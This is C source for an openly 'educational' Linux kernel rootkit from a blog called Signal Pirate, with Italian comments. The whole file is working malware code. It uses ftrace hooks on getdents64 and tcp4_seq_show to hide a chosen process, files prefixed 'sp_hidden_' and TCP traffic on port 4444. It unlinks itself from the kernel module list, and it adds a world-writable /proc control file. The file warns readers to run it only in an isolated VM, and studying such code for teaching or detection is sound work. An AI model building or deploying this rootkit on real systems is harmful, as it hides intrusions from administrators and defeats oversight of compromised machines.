/*
 * rootkit.c — Educational Linux Kernel Rootkit
 * Signal Pirate — https://pinperepette.github.io/signal.pirate/
 *
 * ATTENZIONE: codice EDUCATIVO. Usalo SOLO in una VM isolata.
 * NON caricare mai su un sistema di produzione.
 *
 * Target: Ubuntu 22.04 LTS (kernel 5.15) / 24.04 LTS (kernel 6.8)
 * Build:  make
 * Load:   sudo insmod rootkit.ko hidden_pid=1234
 * Unload: sudo rmmod rootkit  (solo se non hidden)
 *         echo "unhide" > /proc/sp_rootkit  (se hidden)
 *
 * Funzionalita':
 *   - Nasconde processi (per PID)
 *   - Nasconde file (per prefisso "sp_hidden_")
 *   - Nasconde connessioni TCP (porta 4444)
 *   - Nasconde se stesso da lsmod e /sys/module
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/inet.h>
#include <net/inet_sock.h>
#include <net/tcp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Signal Pirate");
MODULE_DESCRIPTION("Educational rootkit - DO NOT use in production");

/* ================================================================
 * CONFIGURAZIONE
 * ================================================================ */

#define MAGIC_PREFIX    "sp_hidden_"    /* file con questo prefisso: invisibili  */
#define MAGIC_PORT      4444            /* porta TCP da nascondere               */
#define PROC_ENTRY      "sp_rootkit"    /* /proc entry per controllare il rootkit */

static int hidden_pid = 0;
module_param(hidden_pid, int, 0644);
MODULE_PARM_DESC(hidden_pid, "PID del processo da nascondere");

static bool module_hidden = false;
static struct list_head *saved_mod_list;
static struct proc_dir_entry *proc_entry;


/* ================================================================
 * RESOLVE kallsyms_lookup_name VIA KPROBE
 *
 * Dal kernel 5.7+, kallsyms_lookup_name non e' piu' esportata.
 * Trick: registriamo un kprobe su di essa, leggiamo l'indirizzo,
 * e la deregistriamo subito. Una riga di codice, accesso a tutto.
 * ================================================================ */

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t ksym_lookup;

static int resolve_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("rootkit: cannot resolve kallsyms_lookup_name: %d\n", ret);
        return ret;
    }

    ksym_lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    pr_info("rootkit: kallsyms_lookup_name @ %px\n", ksym_lookup);
    return 0;
}


/* ================================================================
 * INFRASTRUTTURA FTRACE HOOK
 *
 * Ogni hook e' descritto da una struct ftrace_hook.
 * La callback ftrace_thunk intercetta la chiamata alla funzione
 * originale e redirige l'esecuzione alla nostra versione.
 *
 * Protezione da ricorsione: se la chiamata arriva dal nostro
 * modulo (la nostra hook che chiama l'originale), non redirigiamo.
 * ================================================================ */

struct ftrace_hook {
    const char          *name;      /* nome del simbolo kernel      */
    void                *function;  /* la nostra funzione sostituta */
    void                *original;  /* puntatore all'originale      */
    unsigned long       address;    /* indirizzo risolto            */
    struct ftrace_ops   ops;
};

/* Macro per dichiarare un hook */
#define HOOK(_name, _hook, _orig)   \
{                                   \
    .name     = (_name),            \
    .function = (_hook),            \
    .original = (_orig),            \
}

/*
 * ftrace_thunk — il cuore del meccanismo.
 *
 * Quando il kernel chiama la funzione hookata, ftrace ci notifica.
 * Noi cambiamo il registro IP (instruction pointer) per puntare
 * alla nostra funzione. L'esecuzione salta al nostro codice.
 *
 * Il check within_module() impedisce la ricorsione infinita:
 * quando la nostra hook chiama l'originale, la chiamata viene
 * di nuovo intercettata da ftrace, ma vede che parent_ip e'
 * nel nostro modulo e lascia passare.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,11,0)
static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    /* Se la chiamata viene dal nostro modulo, non redirigere */
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}
#else
static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                  struct ftrace_ops *ops,
                                  struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}
#endif

static int install_hook(struct ftrace_hook *hook)
{
    int ret;

    /* Risolvi l'indirizzo del simbolo */
    hook->address = ksym_lookup(hook->name);
    if (!hook->address) {
        pr_err("rootkit: symbol not found: %s\n", hook->name);
        return -ENOENT;
    }

    /* Salva il puntatore all'originale */
    *((unsigned long *)hook->original) = hook->address;

    /* Configura ftrace */
    hook->ops.func  = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (ret) {
        pr_err("rootkit: ftrace_set_filter_ip(%s) failed: %d\n",
               hook->name, ret);
        return ret;
    }

    ret = register_ftrace_function(&hook->ops);
    if (ret) {
        pr_err("rootkit: register_ftrace_function(%s) failed: %d\n",
               hook->name, ret);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return ret;
    }

    pr_info("rootkit: hooked %s @ %px\n", hook->name, (void *)hook->address);
    return 0;
}

static void remove_hook(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    pr_info("rootkit: unhooked %s\n", hook->name);
}


/* ================================================================
 * HOOK 1: getdents64 — NASCONDERE PROCESSI E FILE
 *
 * getdents64 e' la syscall che ls, ps, find usano per leggere
 * il contenuto di una directory. Hookandola, possiamo rimuovere
 * le entry prima che tornino a userspace.
 *
 * Per nascondere un processo: filtriamo /proc/<PID>
 * Per nascondere un file: filtriamo il nome con il prefisso magico
 * ================================================================ */

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

static bool should_hide_entry(const char *name)
{
    /* Nascondi file con prefisso magico */
    if (strncmp(name, MAGIC_PREFIX, strlen(MAGIC_PREFIX)) == 0)
        return true;

    /* Nascondi il PID target (le entry in /proc sono numeri) */
    if (hidden_pid > 0) {
        char pid_str[16];
        snprintf(pid_str, sizeof(pid_str), "%d", hidden_pid);
        if (strcmp(name, pid_str) == 0)
            return true;
    }

    return false;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *user_dirent;
    struct linux_dirent64 *kdirent, *current_dir, *prev_dir;
    unsigned long offset;
    long ret;

    user_dirent = (struct linux_dirent64 __user *)regs->si;

    /* Chiama l'originale */
    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    /* Copia il buffer in kernel space */
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, user_dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    /* Scorri le entry e rimuovi quelle da nascondere */
    offset = 0;
    prev_dir = NULL;

    while (offset < ret) {
        current_dir = (void *)kdirent + offset;

        if (should_hide_entry(current_dir->d_name)) {
            /* Rimuovi questa entry */
            if (current_dir == kdirent) {
                /* Prima entry: sposta tutto indietro */
                ret -= current_dir->d_reclen;
                memmove(kdirent, (void *)kdirent + current_dir->d_reclen, ret);
                continue;
            }
            /* Entry intermedia: allarga la precedente */
            prev_dir->d_reclen += current_dir->d_reclen;
        } else {
            prev_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    /* Copia il buffer filtrato in userspace */
    copy_to_user(user_dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}


/* ================================================================
 * HOOK 2: tcp4_seq_show — NASCONDERE CONNESSIONI TCP
 *
 * /proc/net/tcp e' generato da tcp4_seq_show(). Hookandola,
 * possiamo saltare le righe che contengono la nostra porta.
 * netstat e ss leggono da qui: se la riga non c'e', la
 * connessione non esiste.
 * ================================================================ */

static asmlinkage int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    if (v == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);

    sk = (struct sock *)v;
    if (sk && sk->sk_num == MAGIC_PORT)
        return 0;   /* Salta questa riga: la connessione scompare */

    if (sk && ntohs(sk->sk_dport) == MAGIC_PORT)
        return 0;

    return orig_tcp4_seq_show(seq, v);
}


/* ================================================================
 * TABELLA HOOKS
 * ================================================================ */

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64,   &orig_getdents64),
    HOOK("tcp4_seq_show",        hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int install_hooks(void)
{
    int i, ret;

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        ret = install_hook(&hooks[i]);
        if (ret) {
            /* Rollback degli hook gia' installati */
            while (i--)
                remove_hook(&hooks[i]);
            return ret;
        }
    }

    return 0;
}

static void remove_hooks(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        remove_hook(&hooks[i]);
}


/* ================================================================
 * NASCONDERE IL MODULO
 *
 * Il kernel mantiene una linked list di tutti i moduli caricati.
 * list_del() rimuove il nostro nodo dalla lista.
 * Dopo: lsmod non ci vede, /sys/module/<nome> non esiste.
 * Ma il codice resta in memoria e gira normalmente.
 *
 * Per il cleanup, salviamo il puntatore e possiamo reinserirci.
 * ================================================================ */

static void hide_module(void)
{
    if (module_hidden)
        return;

    saved_mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = true;
    pr_info("rootkit: module hidden from lsmod\n");
}

static void show_module(void)
{
    if (!module_hidden)
        return;

    list_add(&THIS_MODULE->list, saved_mod_list);
    module_hidden = false;
    pr_info("rootkit: module visible again\n");
}


/* ================================================================
 * INTERFACCIA /proc — CONTROLLO DEL ROOTKIT
 *
 * Scriviamo comandi a /proc/sp_rootkit per controllare il modulo:
 *   echo "hide"   > /proc/sp_rootkit   # nascondi il modulo
 *   echo "unhide" > /proc/sp_rootkit   # mostra il modulo
 *   echo "pid 1234" > /proc/sp_rootkit # cambia PID nascosto
 * ================================================================ */

static ssize_t proc_write(struct file *file, const char __user *buf,
                           size_t count, loff_t *ppos)
{
    char cmd[64];
    size_t len = min(count, sizeof(cmd) - 1);

    if (copy_from_user(cmd, buf, len))
        return -EFAULT;
    cmd[len] = '\0';

    /* Rimuovi newline */
    if (len > 0 && cmd[len - 1] == '\n')
        cmd[len - 1] = '\0';

    if (strcmp(cmd, "hide") == 0) {
        hide_module();
    } else if (strcmp(cmd, "unhide") == 0) {
        show_module();
    } else if (strncmp(cmd, "pid ", 4) == 0) {
        if (kstrtoint(cmd + 4, 10, &hidden_pid) == 0)
            pr_info("rootkit: now hiding PID %d\n", hidden_pid);
    } else if (strcmp(cmd, "pid 0") == 0 || strcmp(cmd, "pid") == 0) {
        hidden_pid = 0;
        pr_info("rootkit: PID hiding disabled\n");
    }

    return count;
}

static int proc_show(struct seq_file *seq, void *v)
{
    seq_printf(seq, "Signal Pirate Rootkit\n");
    seq_printf(seq, "  hidden_pid:    %d\n", hidden_pid);
    seq_printf(seq, "  magic_prefix:  %s\n", MAGIC_PREFIX);
    seq_printf(seq, "  magic_port:    %d\n", MAGIC_PORT);
    seq_printf(seq, "  module_hidden: %s\n", module_hidden ? "yes" : "no");
    return 0;
}

static int proc_open(struct inode *inode, struct file *file)
{
    return single_open(file, proc_show, NULL);
}

static const struct proc_ops proc_fops = {
    .proc_open    = proc_open,
    .proc_read    = seq_read,
    .proc_write   = proc_write,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
};


/* ================================================================
 * INIT / EXIT
 * ================================================================ */

static int __init rootkit_init(void)
{
    int ret;

    pr_info("rootkit: loading...\n");

    /* Step 1: risolvi kallsyms */
    ret = resolve_kallsyms();
    if (ret)
        return ret;

    /* Step 2: installa gli hook ftrace */
    ret = install_hooks();
    if (ret)
        return ret;

    /* Step 3: crea /proc entry */
    proc_entry = proc_create(PROC_ENTRY, 0666, NULL, &proc_fops);
    if (!proc_entry)
        pr_warn("rootkit: failed to create /proc/%s\n", PROC_ENTRY);

    pr_info("rootkit: loaded. hidden_pid=%d, prefix=%s, port=%d\n",
            hidden_pid, MAGIC_PREFIX, MAGIC_PORT);

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Rimuovi /proc entry */
    if (proc_entry)
        proc_remove(proc_entry);

    /* Rimuovi gli hook */
    remove_hooks();

    /* Se nascosto, rimostra prima di uscire */
    if (module_hidden)
        show_module();

    pr_info("rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
